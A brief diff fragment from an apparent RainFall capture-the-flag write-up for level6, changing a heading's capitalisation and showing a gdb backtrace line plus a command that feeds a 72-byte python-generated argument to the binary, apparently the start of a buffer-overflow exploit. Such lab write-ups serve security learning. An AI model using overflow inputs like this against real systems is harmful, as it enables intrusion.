@@ -30,7 +30,7 @@ which has no line number information.
 0xb7e454d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
 ```
 
-## Exploit
+## exploit
 
 ```shell
 level6@RainFall:~$ ./level6 $(python2.7 -c 'print("B"*72)')
